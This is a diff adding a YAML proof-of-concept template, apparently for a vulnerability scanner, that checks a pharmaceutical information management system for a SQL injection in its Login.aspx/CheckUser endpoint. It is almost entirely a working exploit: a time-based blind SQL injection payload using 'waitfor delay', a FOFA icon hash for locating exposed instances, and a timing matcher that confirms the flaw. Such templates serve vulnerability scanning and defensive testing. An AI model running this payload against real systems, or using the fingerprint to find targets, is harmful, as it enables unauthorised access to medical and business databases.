@@ -1,0 +1,20 @@
+id: poc-yaml-qianyiyun-mims-checkuser-sqli
+info:
+  name: 千宜医药信息管理系统 CheckUser SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 医药信息管理系统
+  fofa: icon_hash="775044030"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /Login.aspx/CheckUser
+  headers:
+    Content-Type: application/json; charset=utf-8
+  data: '{"value":"'' waitfor delay ''0:0:{{.t1}}''--+"}'
+  expression: status_code == 200 && body == `{"d":""}` && contains(content_type,"application/json")
+    && duration >= t1 && duration <= t2
+transport: http
